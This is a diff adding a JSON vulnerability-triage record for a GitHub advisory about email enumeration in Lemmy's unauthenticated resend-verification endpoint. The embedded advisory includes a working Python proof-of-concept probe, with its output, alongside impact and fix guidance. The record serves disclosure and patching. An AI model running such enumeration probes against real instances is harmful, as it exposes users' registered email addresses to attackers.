@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/11564377?v=4\", \"events_url\": \"https://api.github.com/users/adrgs/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/adrgs/followers\", \"following_url\": \"https://api.github.com/users/adrgs/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/adrgs/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/adrgs\", \"id\": 11564377, \"login\": \"adrgs\", \"node_id\": \"MDQ6VXNlcjExNTY0Mzc3\", \"organizations_url\": \"https://api.github.com/users/adrgs/orgs\", \"received_events_url\": \"https://api.github.com/users/adrgs/received_events\", \"repos_url\": \"https://api.github.com/users/adrgs/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/adrgs/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/adrgs/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/adrgs\", \"user_view_type\": \"public\"}}, {\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/253543362?v=4\", \"events_url\": \"https://api.github.com/users/aisafe-bot/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/aisafe-bot/followers\", \"following_url\": \"https://api.github.com/users/aisafe-bot/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/aisafe-bot/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/aisafe-bot\", \"id\": 253543362, \"login\": \"aisafe-bot\", \"node_id\": \"U_kgDODxzDwg\", \"organizations_url\": \"https://api.github.com/users/aisafe-bot/orgs\", \"received_events_url\": \"https://api.github.com/users/aisafe-bot/received_events\", \"repos_url\": \"https://api.github.com/users/aisafe-bot/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/aisafe-bot/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/aisafe-bot/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/aisafe-bot\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 5.5, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:P\"}}, \"cwes\": [{\"cwe_id\": \"CWE-204\", \"name\": \"Observable Response Discrepancy\"}], \"description\": \"## Summary\\n\\nThe unauthenticated resend-verification endpoint returns different responses for registered and unregistered email addresses. A malicious third party can submit candidate addresses to `/api/v4/account/auth/resend_verification_email` and distinguish accounts from misses.\\n\\n## Details\\n\\n`resend_verification_email()` looks up the submitted address and returns the lookup error to the caller:\\n\\n```rust\\nlet local_user_view = LocalUserView::find_by_email(&mut context.pool(), &email).await?;\\ncheck_local_user_valid(&local_user_view)?;\\n```\\n\\nThe password reset endpoint already uses a safer pattern. It discards lookup errors and returns success, which prevents the same account-discovery channel.\\n\\n## Proof of Concept\\n\\nThe following script creates one user and probes that address plus a missing address.\\n\\n```python\\nimport requests, random, string\\n\\nBASE = \\\"http://127.0.0.1:8536/api/v4\\\"  # change to the target Lemmy URL\\nADMIN_USER = \\\"lemmy\\\"\\nADMIN_PASS = \\\"lemmylemmy\\\"\\nPASSWORD = \\\"Password123456!\\\"\\n\\ndef post(path, **body):\\n    return requests.post(BASE + path, json=body)\\n\\nsuffix = \\\"enum\\\" + \\\"\\\".join(random.choice(string.ascii_lowercase) for _ in range(6))\\nadmin = post(\\\"/account/auth/login\\\", username_or_email=ADMIN_USER, password=ADMIN_PASS).json()[\\\"jwt\\\"]\\nrequests.put(BASE + \\\"/site\\\", headers={\\\"Authorization\\\": \\\"Bearer \\\" + admin},\\n             json={\\\"registration_mode\\\": \\\"open\\\", \\\"email_verification_required\\\": False})\\n\\nemail = \\\"alice\\\" + suffix + \\\"@example.test\\\"\\npost(\\\"/account/auth/register\\\", username=\\\"alice\\\" + suffix, password=PASSWORD,\\n     password_verify=PASSWORD, email=email).raise_for_status()\\n\\nfor candidate in [email, \\\"missing\\\" + suffix + \\\"@example.test\\\"]:\\n    r = post(\\\"/account/auth/resend_verification_email\\\", email=candidate)\\n    print(candidate, \\\"HTTP\\\", r.status_code, r.text[:300])\\n\\n```\\n\\nOutput:\\n\\n```text\\nalicepoceudtpf@example.test HTTP 200 {\\\"success\\\":true}\\nmissingpoceudtpf@example.test HTTP 404 {\\\"error\\\":\\\"not_found\\\",\\\"cause\\\":\\\"Record not found\\\"}\\n```\\n\\n## Impact\\n\\nA malicious third party can enumerate registered email addresses without authentication. The endpoint uses the registration rate limit bucket, not an endpoint-specific anti-enumeration limit, so the attacker can automate probes across candidate address lists. The response also distinguishes missing accounts from banned or deleted accounts because `check_local_user_valid()` returns separate error types.\\n\\n## Recommended Fix\\n\\nUse the password-reset pattern for resend verification. Move the lookup and email-send work into a helper, ignore helper errors in the handler, and always return `{\\\"success\\\": true}` for syntactically valid input.\\n\\n---\\n*Found by [aisafe.io](https://aisafe.io)*\", \"ghsa_id\": \"GHSA-qxrw-f6fh-34r7\", \"github_reviewed_at\": \"2026-05-06T23:49:18Z\", \"html_url\": \"https://github.com/advisories/GHSA-qxrw-f6fh-34r7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-qxrw-f6fh-34r7\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-06T23:49:18Z\", \"references\": [\"https://github.com/LemmyNet/lemmy/security/advisories/GHSA-qxrw-f6fh-34r7\", \"https://github.com/LemmyNet/lemmy/commit/4afff1699d08920b9a9023e81b229d772b894d91\", \"https://github.com/advisories/GHSA-qxrw-f6fh-34r7\"], \"repository_advisory_url\": \"https://api.github.com/repos/LemmyNet/lemmy/security-advisories/GHSA-qxrw-f6fh-34r7\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/LemmyNet/lemmy\", \"summary\": \"Lemmy resend-verification endpoint exposes registered email addresses to unauthenticated users\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-07T13:20:33Z\", \"url\": \"https://api.github.com/advisories/GHSA-qxrw-f6fh-34r7\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"rust\", \"name\": \"lemmy_api\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.19.1-rc.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-qxrw-f6fh-34r7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "lemmy_api: <= 0.19.1-rc.1"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 5.5,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "lemmy_api"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:03.540852Z",
+  "provenance": {
+    "content_sha256": "828691eccc09e4da68cb0e4f1c435d163177a2cdfaebb1726ddb04fd251bb8ce",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-06T23:49:18Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-qxrw-f6fh-34r7",
+  "status": "active",
+  "title": "Lemmy resend-verification endpoint exposes registered email addresses to unauthenticated users",
+  "updated_at": "2026-05-07T13:20:33Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-qxrw-f6fh-34r7"
+}
